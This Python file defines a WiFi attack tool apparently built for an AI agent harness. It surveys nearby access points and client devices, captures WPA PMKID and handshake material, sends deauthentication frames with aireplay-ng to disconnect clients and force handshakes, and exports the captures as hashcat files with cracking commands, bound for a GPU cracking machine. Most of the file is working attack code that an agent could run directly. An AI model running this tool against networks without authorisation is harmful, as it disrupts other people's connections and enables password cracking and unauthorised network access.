"""WiFi Intel tool — Alfa adapter passive landscape surveys and targeted WPA capture.

Uses the aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng) and hcxdumptool
for passive PMKID/EAPOL capture.  All captures are organized under a workspace
directory with metadata JSON for transfer to a GPU cracking box.
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
import time
from pathlib import Path
from typing import Any, Optional

from tools.parsers import ingest_output
from tools._tool_base import Tool

logger = logging.getLogger(__name__)


def _sanitize(text: str) -> str:
    """Strip characters that are unsafe in directory names."""
    return re.sub(r"[^A-Za-z0-9_-]", "_", text)


class WiFiIntelTool(Tool):
    """Alfa WiFi adapter — passive landscape surveys and targeted WPA capture."""

    def __init__(
        self,
        interface: str = "wlan1",
        monitor_interface: str = "wlan1mon",
        workspace: str = "/tmp/protopen",
    ):
        self._iface = interface
        self._mon = monitor_interface
        self._workspace = Path(workspace)
        self._workspace.mkdir(parents=True, exist_ok=True)
        # Set externally by the agent harness when target_intel is available.
        self._target_store = None  # type: ignore[assignment]

    @property
    def name(self) -> str:
        return "wifi_intel"

    @property
    def description(self) -> str:
        return (
            "Alfa WiFi adapter control — passive landscape surveys and targeted WPA capture. "
            "Actions: monitor_start/stop (airmon-ng), survey (channel-hopping airodump-ng scan, "
            "ingests all APs + stations into target_intel), capture_pmkid (hcxdumptool passive "
            "PMKID/EAPOL capture → hashcat .hc22000), capture_handshake (targeted WPA handshake "
            "via deauth + airodump-ng), signal_history (query RSSI history for a BSSID), "
            "export (dump all known WiFi networks from target_intel)."
        )

    @property
    def parameters(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "description": "Action to perform",
                    "enum": [
                        "monitor_start",
                        "monitor_stop",
                        "survey",
                        "capture_pmkid",
                        "capture_handshake",
                        "signal_history",
                        "export",
                    ],
                },
                "interface": {
                    "type": "string",
                    "description": "Managed-mode interface to place into monitor mode (default: wlan1)",
                },
                "monitor_interface": {
                    "type": "string",
                    "description": "Monitor-mode interface name (default: wlan1mon)",
                },
                "band": {
                    "type": "string",
                    "description": "Band to scan: '2.4', '5', or 'both' (default: '2.4'). Ignored when channels is set.",
                    "enum": ["2.4", "5", "both"],
                },
                "channels": {
                    "type": "string",
                    "description": "Comma-separated channel list passed to airodump-ng -c (e.g. '1,6,11,36,40,44,48,149,153,157,161'). More stable than --band on mt76 drivers. Overrides band when set.",
                },
                "duration": {
                    "type": "integer",
                    "description": "Capture / scan duration in seconds",
                },
                "bssid": {
                    "type": "string",
                    "description": "Target AP BSSID (required for capture_handshake, optional filter for capture_pmkid, required for signal_history)",
                },
                "bssid_filter": {
                    "type": "string",
                    "description": "Optional BSSID filter for capture_pmkid",
                },
                "channel": {
                    "type": "integer",
                    "description": "Target channel (required for capture_handshake)",
                },
                "ssid": {
                    "type": "string",
                    "description": "Target SSID label (optional, used for capture file naming)",
                },
            },
            "required": ["action"],
        }

    # ── Main dispatcher ────────────────────────────────────────────────────────

    async def execute(self, **kwargs: Any) -> str:
        action = kwargs.get("action", "")
        dispatch = {
            "monitor_start": lambda: self._monitor_start(
                kwargs.get("interface", self._iface)
            ),
            "monitor_stop": lambda: self._monitor_stop(
                kwargs.get("monitor_interface", self._mon)
            ),
            "survey": lambda: self._survey(
                band=kwargs.get("band", "2.4"),
                duration=int(kwargs.get("duration", 900)),
                interface=kwargs.get("interface", self._iface),
                channels=kwargs.get("channels"),
            ),
            "capture_pmkid": lambda: self._capture_pmkid(
                duration=int(kwargs.get("duration", 300)),
                bssid_filter=kwargs.get("bssid_filter") or kwargs.get("bssid"),
            ),
            "capture_handshake": lambda: self._capture_handshake(
                bssid=kwargs.get("bssid", ""),
                channel=int(kwargs.get("channel", 0)),
                ssid=kwargs.get("ssid"),
                duration=int(kwargs.get("duration", 60)),
            ),
            "signal_history": lambda: self._signal_history(
                bssid=kwargs.get("bssid", "")
            ),
            "export": lambda: self._export(),
        }
        fn = dispatch.get(action)
        if fn is None:
            return f"Unknown action: {action}. Available: {list(dispatch.keys())}"
        try:
            result = await fn()
            ingest_output("wifi_intel", action, result, getattr(self, "_target_store", None))
            return result
        except Exception as exc:
            logger.exception("WiFiIntelTool error (%s)", action)
            return f"wifi_intel error ({action}): {exc}"

    # ── Low-level subprocess helper ────────────────────────────────────────────

    async def _run(self, *args: str, timeout: int = 120) -> str:
        logger.info("Running: %s", " ".join(args))
        proc = await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            return f"Command timed out after {timeout}s: {' '.join(args)}"
        output = stdout.decode(errors="replace")
        if stderr:
            output += f"\n[stderr] {stderr.decode(errors='replace')}"
        return output.strip()

    async def _run_background(self, *args: str) -> asyncio.subprocess.Process:
        """Start a subprocess in the background; caller is responsible for termination."""
        logger.info("Starting background: %s", " ".join(args))
        return await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )

    # ── Capture directory helper ───────────────────────────────────────────────

    def _capture_dir(self, ssid: str = "", bssid: str = "") -> Path:
        """Return (and create) a timestamped capture directory."""
        ts = int(time.time())
        safe_ssid = _sanitize(ssid) if ssid else "unknown"
        safe_bssid = bssid.replace(":", "") if bssid else "000000000000"
        name = f"{ts}_{safe_ssid}_{safe_bssid}"
        d = self._workspace / "wifi_captures" / name
        d.mkdir(parents=True, exist_ok=True)
        return d

    # ── Actions ────────────────────────────────────────────────────────────────

    async def _monitor_start(self, interface: str) -> str:
        compat_warn = await self._check_kernel_compat()
        # Use iw directly instead of airmon-ng.  airmon-ng runs an interactive
        # prompt when phy has no interface assigned and kills NetworkManager,
        # which destroys any SSH-over-Tailscale session.  iw is non-interactive
        # and leaves all other interfaces untouched.
        await self._run("ip", "link", "set", interface, "down", timeout=10)
        await self._run("iw", "dev", interface, "set", "type", "monitor", timeout=10)
        link_out = await self._run("ip", "link", "set", interface, "up", timeout=10)
        result = link_out or f"Monitor mode started on {interface}"
        if compat_warn:
            result = compat_warn + "\n\n" + result
        return result

    async def _check_kernel_compat(self) -> str:
        """Warn if the kernel has the known mt76 injection regression (>= 6.9.0).

        Linux >= 6.9.0 broke frame injection and active monitor mode across all
        mt76 devices (ZerBea/hcxdumptool#465, openwrt/mt76#839).
        Passive capture (survey, capture_pmkid) still works.
        capture_handshake (deauth injection) will likely fail silently.
        Last known-working: 6.6.40 (LTS) / 6.8.12 (stable).
        """
        try:
            release = await self._run("uname", "-r", timeout=5)
            m = re.match(r"(\d+)\.(\d+)", release.strip())
            if not m:
                return ""
            major, minor = int(m.group(1)), int(m.group(2))
            if (major, minor) >= (6, 9):
                return (
                    f"WARNING: kernel {major}.{minor} has a known mt76 regression "
                    "(Linux >= 6.9.0) that breaks frame injection and deauth. "
                    "Passive capture (survey, capture_pmkid) works normally. "
                    "capture_handshake will likely fail — last working kernels: "
                    "6.6.40 (LTS) / 6.8.12 (stable). "
                    "Ref: ZerBea/hcxdumptool#465"
                )
        except Exception:
            pass
        return ""

    async def _monitor_stop(self, monitor_interface: str) -> str:
        await self._run("ip", "link", "set", monitor_interface, "down", timeout=10)
        await self._run("iw", "dev", monitor_interface, "set", "type", "managed", timeout=10)
        link_out = await self._run("ip", "link", "set", monitor_interface, "up", timeout=10)
        return link_out or f"Monitor mode stopped on {monitor_interface}"

    async def _survey(self, band: str, duration: int, interface: str, channels: Optional[str] = None) -> str:
        """Channel-hopping airodump-ng scan; parses CSV and upserts into target_intel."""
        # Derive monitor interface name (assume convention: {iface}mon)
        mon_iface = self._mon if self._mon else f"{interface}mon"

        cap_dir = self._capture_dir(ssid="survey", bssid="")
        cap_base = str(cap_dir / "capture")

        # channels= is more stable than --band on mt76 drivers (less channel switching).
        # Use -c <list> when provided, otherwise fall back to --band.
        if channels:
            cmd = [
                "airodump-ng",
                "--write", cap_base,
                "--output-format", "csv,pcap",
                "-c", channels,
                mon_iface,
            ]
        else:
            band_map = {"2.4": "bg", "5": "a", "both": "abg"}
            band_flag = band_map.get(band, "bg")
            cmd = [
                "airodump-ng",
                "--write", cap_base,
                "--output-format", "csv,pcap",
                "--band", band_flag,
                mon_iface,
            ]

        output = await self._run(*cmd, timeout=duration + 30)

        # Parse the CSV output produced by airodump-ng
        csv_path = Path(f"{cap_base}-01.csv")
        aps: list[dict] = []
        stations: list[dict] = []

        if csv_path.exists():
            aps, stations = self._parse_airodump_csv(csv_path)
        else:
            # airodump-ng may not have written if it timed out — parse stdout fallback
            aps, stations = _parse_airodump_stdout(output)

        # Upsert into target_intel store if available
        store = getattr(self, "_target_store", None)
        if store is not None:
            for ap in aps:
                store.upsert_wifi_network(
                    bssid=ap.get("bssid", ""),
                    ssid=ap.get("ssid", ""),
                    channel=ap.get("channel", 0),
                    rssi=ap.get("rssi", 0),
                    encryption=ap.get("encryption", ""),
                )
            for sta in stations:
                store.upsert_wifi_station(
                    mac=sta.get("mac", ""),
                    rssi=sta.get("rssi", 0),
                )

        summary = {
            "action": "survey",
            "band": band,
            "duration_seconds": duration,
            "capture_path": str(cap_dir),
            "ap_count": len(aps),
            "station_count": len(stations),
            "aps": aps,
        }
        return json.dumps(summary)

    def _parse_airodump_csv(self, csv_path: Path) -> tuple[list[dict], list[dict]]:
        """Parse airodump-ng CSV into (aps, stations) lists."""
        aps: list[dict] = []
        stations: list[dict] = []
        try:
            text = csv_path.read_text(errors="replace")
        except OSError:
            return aps, stations

        # airodump-ng CSV has two sections separated by a blank line:
        # 1. AP section (starts with header "BSSID, First time seen, ...")
        # 2. Station section (starts with header "Station MAC, ...")
        sections = re.split(r"\n\s*\n", text, maxsplit=1)
        ap_section = sections[0] if sections else ""
        sta_section = sections[1] if len(sections) > 1 else ""

        for line in ap_section.splitlines():
            line = line.strip()
            if not line or line.startswith("BSSID"):
                continue
            parts = [p.strip() for p in line.split(",")]
            if len(parts) < 14:
                continue
            bssid = parts[0].strip()
            if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
                continue
            try:
                rssi = int(parts[8]) if parts[8].strip().lstrip("-").isdigit() else 0
            except (IndexError, ValueError):
                rssi = 0
            try:
                channel = int(parts[3].strip()) if parts[3].strip().lstrip("-").isdigit() else 0
            except (IndexError, ValueError):
                channel = 0
            encryption = parts[5].strip() if len(parts) > 5 else ""
            ssid = parts[13].strip() if len(parts) > 13 else ""
            aps.append({"bssid": bssid, "ssid": ssid, "channel": channel, "rssi": rssi, "encryption": encryption})

        for line in sta_section.splitlines():
            line = line.strip()
            if not line or line.startswith("Station MAC"):
                continue
            parts = [p.strip() for p in line.split(",")]
            if len(parts) < 6:
                continue
            mac = parts[0].strip()
            if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac):
                continue
            try:
                rssi = int(parts[3].strip()) if parts[3].strip().lstrip("-").isdigit() else 0
            except (IndexError, ValueError):
                rssi = 0
            stations.append({"mac": mac, "rssi": rssi})

        return aps, stations

    async def _capture_pmkid(
        self,
        duration: int,
        bssid_filter: Optional[str],
    ) -> str:
        """Passive PMKID/EAPOL capture via hcxdumptool; converts to hc22000."""
        cap_dir = self._capture_dir(
            ssid="pmkid",
            bssid=bssid_filter or "",
        )
        pcapng_path = cap_dir / "capture.pcapng"
        hc22000_path = cap_dir / "capture.hc22000"
        meta_path = cap_dir / "metadata.json"

        cmd = [
            "hcxdumptool",
            "-i", self._mon,
            "-o", str(pcapng_path),
            "--active_beacon",
            "--enable_status=1",
        ]
        if bssid_filter:
            filter_file = cap_dir / "bssid_filter.txt"
            filter_file.write_text(bssid_filter + "\n")
            cmd += [f"--filterlist_ap={filter_file}"]

        capture_output = await self._run(*cmd, timeout=duration + 30)

        # Convert to hashcat-ready hc22000
        convert_output = await self._run(
            "hcxpcapngtool",
            str(pcapng_path),
            "-o", str(hc22000_path),
            timeout=60,
        )

        ts = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        metadata = {
            "ssid": "",
            "bssid": bssid_filter or "",
            "timestamp": ts,
            "capture_type": "pmkid",
            "hashcat_mode": 22000,
            "hashcat_cmd_example": f"hashcat -m 22000 {hc22000_path.name} wordlist.txt",
            "capture_path": str(cap_dir),
            "pcapng": str(pcapng_path),
            "hc22000": str(hc22000_path),
        }
        meta_path.write_text(json.dumps(metadata, indent=2))

        return json.dumps({
            "action": "capture_pmkid",
            "capture_path": str(cap_dir),
            "pcapng": str(pcapng_path),
            "hc22000": str(hc22000_path),
            "metadata": metadata,
            "hcxdumptool_output": capture_output[:500],
            "hcxpcapngtool_output": convert_output[:300],
        })

    async def _capture_handshake(
        self,
        bssid: str,
        channel: int,
        ssid: Optional[str],
        duration: int,
    ) -> str:
        """Targeted WPA handshake capture via deauth + airodump-ng."""
        if not bssid:
            return "capture_handshake requires bssid"
        if not channel:
            return "capture_handshake requires channel"

        cap_dir = self._capture_dir(ssid=ssid or "", bssid=bssid)
        cap_base = str(cap_dir / "capture")
        meta_path = cap_dir / "metadata.json"

        # Step 1: lock to target channel
        await self._run("iwconfig", self._mon, "channel", str(channel), timeout=10)

        # Step 2: start airodump-ng in background
        airodump_proc = await self._run_background(
            "airodump-ng",
            "-c", str(channel),
            "--bssid", bssid,
            "-w", cap_base,
            "--output-format", "pcap",
            self._mon,
        )

        # Brief settle time before sending deauth
        await asyncio.sleep(2)

        # Step 3: send deauth frames to trigger handshake
        deauth_output = await self._run(
            "aireplay-ng",
            "-0", "5",
            "-a", bssid,
            self._mon,
            timeout=30,
        )

        # Step 4: wait for the rest of the capture duration
        remaining = max(0, duration - 2 - 5)
        if remaining:
            await asyncio.sleep(remaining)

        # Step 5: kill airodump-ng
        try:
            airodump_proc.terminate()
            await asyncio.wait_for(airodump_proc.wait(), timeout=5)
        except Exception:
            try:
                airodump_proc.kill()
            except Exception:
                pass

        cap_file = Path(f"{cap_base}-01.cap")
        ts = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        metadata = {
            "ssid": ssid or "",
            "bssid": bssid,
            "channel": channel,
            "encryption": "WPA",
            "timestamp": ts,
            "capture_type": "handshake",
            "hashcat_mode": 22000,
            "hashcat_cmd_example": f"hashcat -m 22000 {cap_file.name} wordlist.txt",
            "capture_path": str(cap_dir),
            "cap_file": str(cap_file),
            "note": "Convert with: hcxpcapngtool capture-01.cap -o capture.hc22000",
        }
        meta_path.write_text(json.dumps(metadata, indent=2))

        return json.dumps({
            "action": "capture_handshake",
            "bssid": bssid,
            "ssid": ssid or "",
            "channel": channel,
            "capture_path": str(cap_dir),
            "cap_file": str(cap_file),
            "deauth_output": deauth_output[:300],
            "metadata": metadata,
        })

    async def _signal_history(self, bssid: str) -> str:
        """Query target_intel for RSSI history for a BSSID."""
        if not bssid:
            return json.dumps({"error": "signal_history requires bssid"})
        store = getattr(self, "_target_store", None)
        if store is None:
            return json.dumps({"error": "target_intel store not available"})

        db = store._get_db()
        rows = db.execute(
            "SELECT bssid, ssid, rssi, channel, encryption, first_seen, last_seen "
            "FROM wifi_networks WHERE bssid = ? "
            "ORDER BY last_seen DESC",
            (bssid.upper(),),
        ).fetchall()

        if not rows:
            # Retry with normalized colons
            norm = bssid.upper().replace("-", ":").replace(".", ":")
            rows = db.execute(
                "SELECT bssid, ssid, rssi, channel, encryption, first_seen, last_seen "
                "FROM wifi_networks WHERE bssid = ? "
                "ORDER BY last_seen DESC",
                (norm,),
            ).fetchall()

        if not rows:
            return json.dumps({"bssid": bssid, "records": [], "message": "No records found"})

        records = [dict(r) for r in rows]
        return json.dumps({
            "bssid": bssid,
            "ssid": records[0].get("ssid", ""),
            "records": records,
        })

    async def _export(self) -> str:
        """Dump all known WiFi networks from target_intel + list capture files."""
        store = getattr(self, "_target_store", None)
        networks: list[dict] = []
        if store is not None:
            db = store._get_db()
            rows = db.execute(
                "SELECT bssid, ssid, channel, rssi, encryption, wps, "
                "first_seen, last_seen, notes FROM wifi_networks ORDER BY last_seen DESC"
            ).fetchall()
            networks = [dict(r) for r in rows]

        # List capture files in workspace
        captures: list[dict] = []
        captures_dir = self._workspace / "wifi_captures"
        if captures_dir.exists():
            for cap_dir in sorted(captures_dir.iterdir()):
                if not cap_dir.is_dir():
                    continue
                meta_path = cap_dir / "metadata.json"
                entry: dict = {"path": str(cap_dir), "files": [f.name for f in cap_dir.iterdir()]}
                if meta_path.exists():
                    try:
                        entry["metadata"] = json.loads(meta_path.read_text())
                    except Exception:
                        pass
                captures.append(entry)

        return json.dumps({
            "action": "export",
            "network_count": len(networks),
            "networks": networks,
            "capture_dirs": captures,
        })


# ── Utility: parse airodump stdout when CSV is unavailable ────────────────────

def _parse_airodump_stdout(output: str) -> tuple[list[dict], list[dict]]:
    """Best-effort BSSID/SSID extraction from airodump-ng terminal output."""
    aps: list[dict] = []
    bssid_re = re.compile(
        r"([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}"
        r":[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})"
    )
    seen: set[str] = set()
    for line in output.splitlines():
        m = bssid_re.search(line)
        if m and m.group(1) not in seen:
            bssid = m.group(1)
            seen.add(bssid)
            aps.append({"bssid": bssid, "ssid": "", "channel": 0, "rssi": 0, "encryption": ""})
    return aps, []
